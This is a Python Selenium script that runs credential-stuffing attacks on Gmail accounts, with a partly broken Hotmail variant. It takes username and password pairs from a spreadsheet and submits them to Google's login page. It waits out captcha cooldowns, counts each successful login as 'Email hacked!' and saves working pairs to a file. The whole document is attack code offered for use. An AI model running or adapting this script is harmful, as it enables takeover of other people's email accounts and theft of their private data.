from datetime import datetime
import time, xlrd, sys
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
global driver

Accountshacked = 0
Failedhacks = 0
Totalattempts = 0
row = 0
#credentails
user = ''
password = ''
#creates account file
Account_file = open('Accounts.txt', 'w')
Account_file.close()

#Check version
def checkversion():
    if sys.version_info >= (3,5):
        print ("Version ok")
        return
    else:
        print ("Update your python")
        input ("PRESS ENTER TO CONTINUE.")
        exit()
        
#takes row from spreadsheet
def user_password(row):
    print ("Grabbing Username and Password from spreadsheet")
    book = xlrd.open_workbook('Test_accounts.xlsx')
    first_sheet = book.sheet_by_index(0)
    row = first_sheet.row_values(row)
    row.pop(1)
    print ("OK.")
    return row

def Gmail_login(user, password):
    driver.get("https://accounts.google.com/AddSession?sacu=1&continue=https%3A%2F%2Faccounts.google.com%2FManageAccount&followup=https%3A%2F%2Faccounts.google.com%2FManageAccount#identifier")
    time.sleep(0.45)
    email_field = driver.find_element_by_name("Email")
    email_field.clear()
    email_field.send_keys(user)
    email_field.send_keys(Keys.RETURN)
    time.sleep(0.6)
    if str("#identifier") in str(driver.current_url):
        print ("Email doesnt exist")
        return False
    #driver.find_element_by_name("PersistentCookie").click()
    password_field = driver.find_element_by_name('Passwd')
    password_field.clear()
    password_field.send_keys(password)
    password_field.send_keys(Keys.RETURN)
    if str("function playCaptcha()") in str(driver.page_source):
        #more accuracy needed
        print ("Captcha detected! Waiting 11 minutes \n")
        return 'captcha'
    if str("challengePickerList") in str(driver.page_source):
        print ("Email hacked!")
        return True
    if str("myaccount.google") in str(driver.current_url):
        print ("Email hacked!")
        return True
    if str("accounts.google") in str(driver.current_url):
        print ("Authentication error")
        return False
    else:
        print ("Unknown error.")
        exit()

def hotmail_login(user, password):
    driver.get("https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&ct=1485860125&rver=6.4.6456.0&wp=MBI_SSL_SHARED&wreply=https:%2F%2Fmail.live.com%2Fdefault.aspx%3Frru%3Dinbox&lc=1033&id=64855&mkt=en-us&cbcxt=mai")
    time.sleep(0.45)
    email_field = driver.find_element_by_name("loginfmt")
    email_field.clear()
    email_field.send_keys(user)
    email_field.send_keys(Keys.RETURN)
    #time.sleep(1)
    if str("#identifier") in str(driver.current_url):
        print ("Email doesnt exist")
        return False
    #driver.find_element_by_name("PersistentCookie").click()
    driver.switchTo().frame(arg0)
    password_field = driver.find_element_by_name('Passwd')
    password_field.clear()
    password_field.send_keys(password)
    password_field.send_keys(Keys.RETURN)
    if str("Visual verification") in str(driver.page_source):
        #more accuracy needed
        print ("Captcha detected! Waiting 9 minutes \n")
        return 'captcha'
    if str("accounts.google") in str(driver.current_url):
        print ("Authentication error")
        return False
    if str("myaccount.google") in str(driver.current_url):
        print ("Email hacked!")
        return True
    if str("challenge") in str(driver.current_url):
        print ("Email hacked!")
        return True
    else:
        print ("Unknown error.")
        exit()


startTime = datetime.now()
checkversion()
attempts = int(input("How many accounts: "))
driver = webdriver.Chrome()

while row <= (attempts - 1):
    credentials = user_password(row)
    row = row + 1
    user = str(credentials[0])
    password = str(credentials[1])
    user = user.lower()
    print (user)
    attempt = Gmail_login(user, password)
    if attempt == True:
        #logs hacked email
        print ("Account Hacked: " + user)
        Accountshacked = Accountshacked + 1
        Totalattempts = Totalattempts + 1
        print ("Number of accounts hacked: " + str(Accountshacked))
        print ("Number of Hack attempts: " + str(Totalattempts))
        print ("Number of failed hacks: " + str(Failedhacks) + "\n")
        #Adds hacked email to text file
        Account_file = open('Accounts.txt', 'a')
        Account_file.write (user + " - - " + password + "\n")
        Account_file.close()
    if attempt == False:
        print ("Hack failed")
        Failedhacks = Failedhacks + 1
        Totalattempts = Totalattempts + 1
        print ("Number of accounts hacked: " + str(Accountshacked))
        print ("Number of Hack attempts: " + str(Totalattempts))
        print ("Number of failed hacks: " + str(Failedhacks) + "\n")
    if attempt == 'captcha':
        driver.close()
        driver = webdriver.Chrome()
        time.sleep(660)
        row = row - 1
        continue


driver.close()
print ("Accounts Hacked: \n")
f = open('Accounts.txt')
for x in f:
    print (x)
f.close()

#time taken
z = datetime.now() - startTime
print ("time taken: ",z)


#captcha stays ~7 mins - currently set to a 9min cooldown
